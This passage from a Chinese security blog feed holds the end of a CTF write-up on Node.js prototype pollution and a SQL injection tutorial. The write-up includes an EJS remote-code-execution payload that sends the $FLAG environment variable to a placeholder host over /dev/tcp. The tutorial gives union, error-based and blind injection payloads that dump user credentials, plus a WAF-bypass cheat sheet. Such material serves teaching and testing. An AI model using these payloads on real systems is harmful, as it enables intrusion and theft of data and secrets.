(?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(newContent) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(newContent);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>我们只需要构造type和content两个键值，将<code>Content-Type</code>设置为<code>application/json</code>，然后post访问该接口5次以上便可以</p>
<p>污染点找到了，接下来是如何利用原型链污染来获取Flag，这道题目有两种方式：</p>
<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="利用ejs进行rce"><a href="#利用ejs进行rce" class="headerlink" title="利用ejs进行rce"></a>利用ejs进行rce</h3><p>因为<code>server.js</code>调用了ejs作为模板渲染引擎，经过调试跟进，可以在<code>ejs.js</code>中发现如下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br><span class="line">src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">...</span><br><span class="line">fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line"><span class="comment">// Return a callable function which will execute the function</span></span><br></pre></td></tr></table></figure>


<p>这段代码的意思便是，<code>opt.outputFunctionName</code>会被作为字符串拼接到<code>prepended</code>中，然后到<code>src</code>、<code>fn</code>最终作为代码执行。而且<code>opt.outputFunctionName</code>这个成员在函数的上下文中完全没有出现过，也就是<code>undefined</code>那么我们通过给<code>Object.prototype</code>加上这一属性，就可以达到RCE的效果了</p>
<p>payload如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;b</span></span><br><span class="line"><span class="string">ash -c \&quot;echo $FLAG&gt;/dev/tcp/xxxxx/xx\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>向<code>/add</code>接口POST 6次，然后再访问一次<code>/get</code>，再访问<code>/</code>或<code>/login</code>触发<code>render()</code>函数即可</p>
<p>FLAG在环境变量中</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>contaminate</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入详解2.0-重构篇</title>
    <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><blockquote>
<p>之前写过一篇，但是愈发感觉到之前写的薄弱和乱，所以重构！</p>
</blockquote>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownecEnPtXKhJqdw1B.jpg"></p>
<span id="more"></span>


<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>实际上注入类漏洞最<font color="red"> 本质的原因就是</font> ，<code>混淆了代码和数据的边界</code>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownbP659ZCEGdpOSFm.png"></p>
<ul>
<li>注入的类型总的就只有3种：<ul>
<li>联合注入<ul>
<li>联合注入从类型来划分又有：<ol>
<li>数字型</li>
<li>字符型</li>
</ol>
</li>
<li>联合注入从注入点来划分又有：<ol>
<li>搜索框注入</li>
<li>HTTP头注入<ol>
<li>User-Agent注入</li>
<li>X-Forwarded-For注入</li>
<li>Cookie注入</li>
</ol>
</li>
</ol>
<ul>
<li>报错注入</li>
<li>盲注<ul>
<li>盲注从方式来划分有：<ul>
<li>时间盲注</li>
<li>布尔盲注</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a><center>联合注入</center></h1><p>由<font color="red"> union select</font>得名，是一种最快的查询方式。</p>
<p>从注入类型来划分讲。</p>
<h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><p>也就是不用闭合，用户的输入直接被解析成了新的SQL语句。</p>
<p>从代码层面来看如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id + <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>从上图可以看到<font color="red"> id是以+直接进行拼接的</font> ，这样我们就可以从直接给id，SQL语句让他直接执行以此产生SQL注入。</p>
<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>字符型就要进行闭合，并且闭合是非常关键的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>在第8行可以清晰的看到id被单引号包围起来，如果想要响应自己想要执行的SQL语句就执行如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>


<p>因为<font color="red"> 引号的就近匹配</font> ，所以单引号会和左边最近的符号匹配。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;&quot;;</span></span><br></pre></td></tr></table></figure>


<p><code>&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39;</code> 此部分自成一块</p>
<p><code>#&#39;;&quot;;</code> #之后被注释。</p>
<p>因此你输入的SQL语句<font color="red"> 将被独立代入MySQL数据库解析</font> ，以此达到注入的效果。</p>
<p>之后的按照注入点划分，也要判断数字型和字符型，以此类推。注入语句将放在后面统一讲。</p>
<h2 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h2><p>笼统的讲，叠堆注入也是联合注入。</p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><center>报错注入</center></h1><p>测试时发现会<font color="red"> 回显报错信息</font> ，就可以试试报错注入。</p>
<ul>
<li>报错注入主要用到3个函数<ul>
<li>floor()</li>
<li>extractvalue()</li>
<li>updatexml()</li>
</ul>
</li>
</ul>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ul>
<li><p>数据库</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line">database()</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>表</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>列名</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>dump</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>其他几个函数以此类推，<font color="red"> 绕WAF根据数据库版本换成数学函数。</font> </p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><center>盲注</center></h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><font color="red"> 根据页面的回显不同来判断</font> 。</p>
<p>Payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆表名：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line">爆列明：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),8)=&#x27;</span>username<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆数据：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>




<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>根据回显时间的不同来判断。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if((<span class="number">1</span>)<span class="keyword">like</span>(<span class="number">1</span>),<span class="number">5</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p>Payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库长：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆库名：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆表名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#x27;</span>r<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">爆列明：?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br><span class="line">爆数据：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="string">&#x27;,sleep(5),NULL)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(<span class="keyword">left</span>((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span>,sleep(<span class="number">5</span>),<span class="keyword">NULL</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>


<p>其他皆可以此类推。</p>
<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a><center>group_concat的使用</center></h1><p><font color="red"> mysql版本&gt;5.0切使用了information_schema数据库  </font> </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> (information_schema.schemata )</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x61646D696E75736572</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure>


<p>其他以此类推。</p>
<h1 id="SQL注入绕过速查表"><a href="#SQL注入绕过速查表" class="headerlink" title="SQL注入绕过速查表"></a><center>SQL注入绕过速查表</center></h1><h2 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>     ——<span class="operator">&gt;</span>    <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span>     ——<span class="operator">&gt;</span>    <span class="operator">&amp;&amp;</span></span><br><span class="line">xor ——<span class="operator">&gt;</span> <span class="operator">|</span>   </span><br><span class="line"><span class="keyword">not</span> ——<span class="operator">&gt;</span> <span class="operator">!</span></span><br><span class="line"></span><br><span class="line">十六进制绕过</span><br><span class="line"><span class="keyword">or</span> ——<span class="operator">&gt;</span> o\x72</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">Or</span></span><br><span class="line"><span class="keyword">aNd</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line">    一些unicode编码举例：</span><br><span class="line">    单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    %u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">    %u02c8 %u2032</span></span><br><span class="line"><span class="string">    %uff07 %c0%27</span></span><br><span class="line"><span class="string">    %c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关键字内联注释尝试绕所有</span></span><br><span class="line"><span class="string">/*!or*/</span></span><br><span class="line"><span class="string">/*!and*/</span></span><br></pre></td></tr></table></figure>


<h2 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>


<h2 id="过滤union-select"><a href="#过滤union-select" class="headerlink" title="过滤union\select"></a>过滤union\select</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">例：</span><br><span class="line">过滤代码 <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">十六进制字符绕过</span><br><span class="line"><span class="keyword">select</span> ——<span class="operator">&gt;</span> selec\x74</span><br><span class="line"><span class="keyword">union</span>——<span class="operator">&gt;</span>unio\x6e</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">SelEct</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"></span><br><span class="line">关键字内联绕所有</span><br><span class="line"><span class="comment">/*!union*/</span></span><br><span class="line"><span class="comment">/*!select*/</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">用Tab代替空格<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="comment">/**/</span>()</span><br><span class="line">绕过空格注释符绕过<span class="operator">/</span><span class="operator">/</span><span class="comment">--%20/**/#--+-- -;%00;</span></span><br><span class="line"></span><br><span class="line">空白字符绕过SQLite3  ——     <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>c,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MYSQL</span><br><span class="line">    <span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>B,<span class="number">0</span>D,A0,<span class="number">20</span></span><br><span class="line">PosgressSQL</span><br><span class="line">    <span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">Oracle_11g</span><br><span class="line">    <span class="number">00</span>,<span class="number">0</span>A,<span class="number">0</span>D,<span class="number">0</span>C,<span class="number">09</span>,<span class="number">20</span></span><br><span class="line">MSSQL</span><br><span class="line">    <span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="keyword">OF</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br><span class="line">特殊符号绕过</span><br><span class="line">    `  <span class="operator">+</span>  ！</span><br><span class="line">等科学计数法绕过</span><br><span class="line">    例：</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users <span class="keyword">where</span> user_id0e1union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">unicode编码</span><br><span class="line">    <span class="operator">%</span>u0020 <span class="operator">%</span>uff00</span><br><span class="line">    <span class="operator">%</span>c0<span class="operator">%</span><span class="number">20</span> <span class="operator">%</span>c0<span class="operator">%</span>a0 <span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a0</span><br></pre></td></tr></table></figure>


<h2 id="过滤-x3D"><a href="#过滤-x3D" class="headerlink" title="过滤&#x3D;"></a>过滤&#x3D;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1 like 1#可以绕过对 = &gt; 等过滤</span></span><br><span class="line"><span class="string">or &#x27;</span><span class="number">1</span><span class="string">&#x27; IN (&#x27;</span><span class="number">1234</span><span class="string">&#x27;)#可以替代=</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤比较符-lt-gt"><a href="#过滤比较符-lt-gt" class="headerlink" title="过滤比较符&lt;&gt;"></a>过滤比较符&lt;&gt;</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span>fromuserswhereid<span class="operator">=</span><span class="number">1</span><span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>


<h2 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_id聚合中user_id为<span class="number">1</span>的<span class="keyword">user</span>为admin</span><br></pre></td></tr></table></figure>


